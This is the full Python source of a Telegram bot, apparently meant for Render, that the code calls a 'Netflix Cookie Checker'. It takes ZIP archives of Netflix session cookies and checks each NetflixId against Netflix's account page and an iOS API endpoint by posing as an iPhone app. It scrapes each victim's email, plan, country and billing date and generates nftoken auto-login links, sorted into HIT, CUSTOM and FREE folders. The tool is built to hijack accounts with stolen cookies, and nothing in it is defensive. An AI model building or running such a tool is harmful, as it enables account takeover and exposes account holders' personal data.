import os
import sys
import re
import json
import zipfile
import tempfile
import shutil
import asyncio
import requests
import urllib.parse
from datetime import datetime
from threading import Lock
import time
import gc
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ PORT FIX FOR RENDER ============
PORT = int(os.environ.get("PORT", 10000))
print(f"✅ Server will run on port {PORT}")

# ============ KEEP ALIVE SERVER ============
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import threading

    class KeepAliveHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
        def log_message(self, format, *args):
            pass

    def run_keep_alive():
        try:
            port = int(os.environ.get("PORT", 10000))
            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
            server.serve_forever()
        except:
            pass

    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
    keep_alive_thread.start()
    print("✅ Keep-alive server started")
except Exception as e:
    print(f"⚠️ Keep-alive not started: {e}")

# ============ TELEGRAM IMPORTS ============
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
except Exception as e:
    print(f"❌ Telegram import error: {e}")
    sys.exit(1)

# ============ NETFLIX CONFIGURATION ============
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============ BOT CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ Please set BOT_TOKEN environment variable!")
    sys.exit(1)

MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
BATCH_SIZE = 50  # Files per batch

# ============ COUNTERS (GLOBAL) ============
class GlobalCounters:
    def __init__(self):
        self.hit = 0
        self.custom = 0
        self.free = 0
        self.bad = 0
        self.lock = Lock()
    
    def get_stats(self):
        with self.lock:
            return f"HIT: {self.hit} | CUSTOM: {self.custom} | FREE: {self.free} | BAD: {self.bad}"
    
    def add_hit(self):
        with self.lock:
            self.hit += 1
    
    def add_custom(self):
        with self.lock:
            self.custom += 1
    
    def add_free(self):
        with self.lock:
            self.free += 1
    
    def add_bad(self):
        with self.lock:
            self.bad += 1
    
    def reset(self):
        with self.lock:
            self.hit = 0
            self.custom = 0
            self.free = 0
            self.bad = 0

global_counters = GlobalCounters()

# ============ COOKIE EXTRACTION FUNCTIONS ============
def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def fix_email_display(email):
    if not email or email == "Unknown":
        return email
    return email.replace('\\x40', '@').replace('%40', '@')

def extract_cookie_dict(text):
    cookie_dict = {}
    
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None
    
    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = decode_cookie_value(value)
    
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = decode_cookie_value(match.group(1))
    
    return cookie_dict

def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return extract_cookie_dict(content)
    except Exception:
        return {}

def get_account_info(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None
    
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    cookies = {"NetflixId": netflix_id}
    
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
        text = response.text
        response.close()
        
        info = {
            "status": "Unknown",
            "email": "Unknown",
            "country": "Unknown",
            "plan": "Unknown",
            "maxStreams": "Unknown",
            "memberSince": "Unknown",
            "nextBilling": "Unknown",
        }
        
        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
        if status_match:
            status = status_match.group(1)
            if status == "CURRENT_MEMBER":
                info["status"] = "Active"
            elif status == "FORMER_MEMBER":
                info["status"] = "Canceled"
            elif status == "NEVER_MEMBER":
                info["status"] = "Free"
            else:
                info["status"] = status
        
        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
        if not email_match:
            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
        if email_match:
            info["email"] = fix_email_display(email_match.group(1))
        
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if country_match:
            info["country"] = country_match.group(1)
        
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
        if plan_match:
            info["plan"] = plan_match.group(1)
        
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
        if streams_match:
            info["maxStreams"] = streams_match.group(1)
        
        since_match = re.search(r'"memberSince":"([^"]+)"', text)
        if since_match:
            info["memberSince"] = since_match.group(1)
        
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
        if billing_match:
            info["nextBilling"] = billing_match.group(1)
        
        gc.collect()
        return info
    except Exception:
        return None

def get_nftoken_from_cookies(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None
    
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    headers["Connection"] = "close"
    
    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=10,
            verify=False,
        )
        response.raise_for_status()
        data = response.json()
        response.close()
        
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        
        if not token:
            return None, None
        
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        
        gc.collect()
        return token, expires
    except Exception:
        return None, None

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

def classify_plan(plan_name):
    if not plan_name:
        return "Unknown"
    
    plan_lower = plan_name.lower()
    basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
    standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
    premium_keywords = ["premium", "prémium", "perhe"]
    
    for kw in basic_keywords:
        if kw in plan_lower:
            return "Basic"
    for kw in standard_keywords:
        if kw in plan_lower:
            return "Standard"
    for kw in premium_keywords:
        if kw in plan_lower:
            return "Premium"
    
    return plan_name

def is_valid_cookie(cookie_dict):
    return REQUIRED_COOKIE in cookie_dict

def process_single_cookie(file_path):
    try:
        cookie_dict = extract_cookies_from_file(file_path)
        
        if not is_valid_cookie(cookie_dict):
            return None
        
        account_info = get_account_info(cookie_dict)
        if not account_info or account_info["status"] == "Unknown":
            return None
        
        account_info["email"] = fix_email_display(account_info["email"])
        
        token, expires = get_nftoken_from_cookies(cookie_dict)
        
        if not token:
            return None
        
        time_left_str = "Unknown"
        if expires:
            try:
                expiry_dt = datetime.fromtimestamp(expires)
                time_now = datetime.now()
                time_left = expiry_dt - time_now
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    minutes = (time_left.seconds % 3600) // 60
                    time_left_str = f"{days}d {hours}h {minutes}m"
                else:
                    time_left_str = "EXPIRED"
            except:
                pass
        
        result = {
            "email": account_info["email"],
            "status": account_info["status"],
            "country": account_info["country"],
            "plan": account_info["plan"],
            "plan_type": classify_plan(account_info["plan"]),
            "maxStreams": account_info["maxStreams"],
            "memberSince": account_info["memberSince"],
            "nextBilling": account_info["nextBilling"],
            "nftoken": token,
            "expires": expires,
            "expiry_formatted": format_expiry(expires),
            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
            "time_left": time_left_str
        }
        
        return result
    except Exception as e:
        return None

# ============ FILE FUNCTIONS ============
def extract_zip(file_path, extract_path):
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        return True, None
    except zipfile.BadZipFile:
        return False, "Corrupted ZIP file"
    except Exception as e:
        return False, f"Extraction error: {str(e)}"

def find_txt_files(folder_path):
    txt_files = []
    try:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
    except Exception:
        pass
    return txt_files

def create_account_file(result, folder_path, filename):
    filepath = os.path.join(folder_path, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write("NETFLIX ACCOUNT INFORMATION\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"EMAIL: {result['email']}\n")
        f.write(f"STATUS: {result['status']}\n")
        f.write(f"COUNTRY: {result['country']}\n")
        f.write(f"PLAN: {result['plan']} ({result['plan_type']})\n")
        f.write(f"MAX STREAMS: {result['maxStreams']}\n")
        f.write(f"MEMBER SINCE: {result['memberSince']}\n")
        f.write(f"NEXT BILLING: {result['nextBilling']}\n")
        f.write(f"EXPIRES: {result['expiry_formatted']}\n")
        f.write(f"TIME LEFT: {result.get('time_left', 'Unknown')}\n")
        f.write("\n" + "-" * 50 + "\n")
        f.write("NFTOKEN LINKS:\n")
        f.write("-" * 50 + "\n")
        f.write(f"PC LINK: {result['pc_link']}\n")
        f.write(f"PHONE LINK: {result['phone_link']}\n")
        f.write("\n" + "=" * 50 + "\n")
        f.write(f"CHECKED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

def create_batch_zip(results, batch_num, timestamp):
    try:
        temp_dir = tempfile.mkdtemp()
        hit_folder = os.path.join(temp_dir, "HIT")
        custom_folder = os.path.join(temp_dir, "CUSTOM")
        free_folder = os.path.join(temp_dir, "FREE")
        os.makedirs(hit_folder, exist_ok=True)
        os.makedirs(custom_folder, exist_ok=True)
        os.makedirs(free_folder, exist_ok=True)
        
        for result in results:
            email_safe = result['email'].replace('@', '_at_').replace('.', '_')
            filename = f"{email_safe}.txt"
            if result["status"] == "Active":
                create_account_file(result, hit_folder, filename)
            elif result["status"] == "Canceled":
                create_account_file(result, custom_folder, filename)
            elif result["status"] == "Free":
                create_account_file(result, free_folder, filename)
        
        zip_path = os.path.join(temp_dir, f"Result_{timestamp}_{batch_num}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
        
        return zip_path
    except Exception as e:
        print(f"Error creating ZIP: {e}")
        return None

# ============ BATCH PROCESSOR ============
class BatchProcessor:
    def __init__(self, update, context, total_files, timestamp):
        self.update = update
        self.context = context
        self.total_files = total_files
        self.timestamp = timestamp
        self.batch_num = 0
        self.total_batches = (total_files + BATCH_SIZE - 1) // BATCH_SIZE
        self.batch_results = []
        self.batch_stats = []
    
    async def process_batch(self, batch_files, batch_num):
        results = []
        processed = 0
        batch_hit = 0
        batch_custom = 0
        batch_free = 0
        batch_bad = 0
        
        # Send batch start message
        start_msg = await self.update.message.reply_text(
            f"📦 **Batch #{batch_num}/{self.total_batches}**\n\n"
            f"📁 Processing {len(batch_files)} files...",
            parse_mode="Markdown"
        )
        
        for file_path in batch_files:
            try:
                processed += 1
                result = process_single_cookie(file_path)
                
                if result:
                    results.append(result)
                    if result["status"] == "Active":
                        batch_hit += 1
                        global_counters.add_hit()
                    elif result["status"] == "Canceled":
                        batch_custom += 1
                        global_counters.add_custom()
                    elif result["status"] == "Free":
                        batch_free += 1
                        global_counters.add_free()
                else:
                    batch_bad += 1
                    global_counters.add_bad()
                
                # Update progress every 5 files
                if processed % 5 == 0 or processed == len(batch_files):
                    await start_msg.edit_text(
                        f"📦 **Batch #{batch_num}/{self.total_batches}**\n\n"
                        f"📁 {processed}/{len(batch_files)} files checked\n"
                        f"📊 HIT: {batch_hit} | CUSTOM: {batch_custom} | FREE: {batch_free} | BAD: {batch_bad}",
                        parse_mode="Markdown"
                    )
                
                await asyncio.sleep(0.05)
                
            except Exception as e:
                batch_bad += 1
                global_counters.add_bad()
                continue
        
        # Delete batch progress message
        await start_msg.delete()
        
        # Send batch summary (ONLY STATS, NO INDIVIDUAL ACCOUNTS)
        batch_stats_msg = f"📦 **Batch #{batch_num}/{self.total_batches} Complete**\n\n"
        batch_stats_msg += f"📊 HIT: {batch_hit} | CUSTOM: {batch_custom} | FREE: {batch_free} | BAD: {batch_bad}\n"
        batch_stats_msg += f"📁 Files: {len(batch_files)}\n"
        batch_stats_msg += f"✅ Valid: {len(results)}"
        
        await self.update.message.reply_text(batch_stats_msg, parse_mode="Markdown")
        
        # Store batch stats
        self.batch_stats.append({
            "batch": batch_num,
            "hit": batch_hit,
            "custom": batch_custom,
            "free": batch_free,
            "bad": batch_bad,
            "total": len(results)
        })
        
        # Create and send ZIP (ONLY ZIP, NO INDIVIDUAL MESSAGES)
        if results:
            zip_path = create_batch_zip(results, batch_num, self.timestamp)
            if zip_path and os.path.exists(zip_path):
                with open(zip_path, 'rb') as f:
                    await self.update.message.reply_document(
                        document=f,
                        filename=f"Result_{self.timestamp}_{batch_num}.zip",
                        caption=f"📦 **Batch #{batch_num} Results**\n\n"
                                f"✅ Valid accounts: {len(results)}\n"
                                f"📊 HIT: {batch_hit} | CUSTOM: {batch_custom} | FREE: {batch_free}",
                        parse_mode="Markdown"
                    )
                try:
                    os.remove(zip_path)
                    shutil.rmtree(os.path.dirname(zip_path))
                except:
                    pass
        
        return results
    
    async def run(self, all_files):
        total_processed = 0
        
        for i in range(0, len(all_files), BATCH_SIZE):
            self.batch_num += 1
            batch_files = all_files[i:i + BATCH_SIZE]
            
            batch_results = await self.process_batch(batch_files, self.batch_num)
            self.batch_results.extend(batch_results)
            total_processed += len(batch_files)
            
            gc.collect()
            
            if self.batch_num < self.total_batches:
                await asyncio.sleep(0.5)
        
        # Send final summary
        await self.send_final_summary()
        
        return self.batch_results
    
    async def send_final_summary(self):
        final_message = "✅ **SCAN COMPLETE!**\n\n"
        final_message += "📊 **FINAL STATISTICS**\n"
        final_message += "-" * 30 + "\n"
        final_message += f"{global_counters.get_stats()}\n\n"
        final_message += "📦 **BATCHES SUMMARY**\n"
        final_message += "-" * 30 + "\n"
        
        for stat in self.batch_stats:
            final_message += f"Batch #{stat['batch']}: "
            final_message += f"HIT: {stat['hit']} | CUSTOM: {stat['custom']} | "
            final_message += f"FREE: {stat['free']} | BAD: {stat['bad']}\n"
        
        final_message += "\n" + "-" * 30 + "\n"
        final_message += f"📁 Total files: {self.total_files}\n"
        final_message += f"✅ Total valid accounts: {len(self.batch_results)}\n"
        final_message += f"📦 Total batches: {self.total_batches}\n"
        final_message += f"📎 All results sent as separate ZIP files above."
        
        await self.update.message.reply_text(final_message, parse_mode="Markdown")

# ============ TELEGRAM HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
        [InlineKeyboardButton("📖 How to Use", callback_data="help")],
        [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🎬 **Netflix Cookie Checker Bot**\n\n"
        f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
        f"⚡ **Batch processing: {BATCH_SIZE} files per batch**\n"
        f"⚠️ **Maximum file size: 5 MB**\n\n"
        f"📦 Each batch results sent as separate ZIP file.\n"
        f"📊 Final summary with all statistics.\n"
        f"🔹 No individual account messages.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **How to Use**\n\n"
        "1️⃣ Collect Netflix cookies in TXT files\n"
        "2️⃣ Put all files in one folder\n"
        "3️⃣ Compress folder as ZIP\n"
        "4️⃣ Send the ZIP file to the bot\n\n"
        "📂 **Required Cookie Format:**\n"
        "• Netscape format or JSON\n"
        "• Must contain: NetflixId\n\n"
        f"⚡ **Processing:** {BATCH_SIZE} files per batch\n"
        "📦 Each batch = separate ZIP file\n"
        "📊 Final summary with all statistics\n"
        "🔹 No individual account messages"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_text = (
        "ℹ️ **About Bot**\n\n"
        "Netflix Cookie Checker Bot\n"
        "Checks Netflix cookies and generates NFToken links.\n\n"
        "🔹 Version: 11.0 (Batch ZIP Only)\n"
        f"🔹 Batch size: {BATCH_SIZE} files\n"
        "🔹 Each batch = separate ZIP\n"
        "🔹 Final summary with statistics\n"
        "🔹 Organized folders: HIT, CUSTOM, FREE\n"
        "🔹 No individual account messages"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"📊 **Current Statistics**\n\n{global_counters.get_stats()}\n\n🔄 Use /resetstats to reset counters"
    keyboard = [
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global_counters.reset()
    if update.callback_query:
        await update.callback_query.answer("📊 Statistics reset!", show_alert=True)
        await stats_command(update, context)
    else:
        await update.message.reply_text("📊 Statistics reset!")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "send_file":
        await query.edit_message_text("📤 **Send the ZIP file now**", parse_mode="Markdown")
    elif query.data == "help":
        await help_command(update, context)
    elif query.data == "about":
        await about_command(update, context)
    elif query.data == "stats":
        await stats_command(update, context)
    elif query.data == "reset_stats":
        await reset_stats_command(update, context)
    elif query.data == "back":
        keyboard = [
            [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
            [InlineKeyboardButton("📖 How to Use", callback_data="help")],
            [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🎬 **Netflix Cookie Checker Bot**\n\n"
            f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
            f"⚡ **Batch processing: {BATCH_SIZE} files per batch**\n"
            f"⚠️ **Maximum file size: 5 MB**",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ============ MAIN HANDLER ============
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        document = update.message.document
        
        if document.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(
                f"❌ **File too large!**\n\nMax: 5 MB\nYour file: {document.file_size / (1024*1024):.2f} MB",
                parse_mode="Markdown"
            )
            return
        
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.zip'):
            await update.message.reply_text(
                "❌ **Unsupported file format!**\n\nPlease send ZIP files only.",
                parse_mode="Markdown"
            )
            return
        
        await update.message.reply_text(
            "⏳ **Downloading and extracting your file...**",
            parse_mode="Markdown"
        )
        
        temp_dir = tempfile.mkdtemp()
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        file_path = os.path.join(temp_dir, file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        success, error_msg = extract_zip(file_path, extract_dir)
        if not success:
            await update.message.reply_text(f"❌ **Failed to extract!**\n\n{error_msg}", parse_mode="Markdown")
            shutil.rmtree(temp_dir)
            return
        
        txt_files = find_txt_files(extract_dir)
        if not txt_files:
            await update.message.reply_text("❌ **No TXT files found!**", parse_mode="Markdown")
            shutil.rmtree(temp_dir)
            return
        
        total_files = len(txt_files)
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        
        await update.message.reply_text(
            f"📂 **Found {total_files} TXT files**\n\n"
            f"⚡ Will process in batches of {BATCH_SIZE}\n"
            f"📦 Estimated batches: {(total_files + BATCH_SIZE - 1) // BATCH_SIZE}\n\n"
            f"📎 Results will be sent as separate ZIP files.",
            parse_mode="Markdown"
        )
        
        processor = BatchProcessor(update, context, total_files, timestamp)
        await processor.run(txt_files)
        
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Error:** {str(e)}", parse_mode="Markdown")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")

# ============ MAIN ============
def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("about", about_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("resetstats", reset_stats_command))
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(send_file|help|about|back|stats|reset_stats)$"))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_error_handler(error_handler)
        
        print("🤖 Netflix Cookie Checker Bot is running...")
        print(f"✅ Batch size: {BATCH_SIZE} files per batch")
        print("📦 Each batch = separate ZIP file (HIT, CUSTOM, FREE folders)")
        print("📊 Final summary with all statistics")
        print("🔹 No individual account messages")
        print("🌐 Keep-alive server running")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
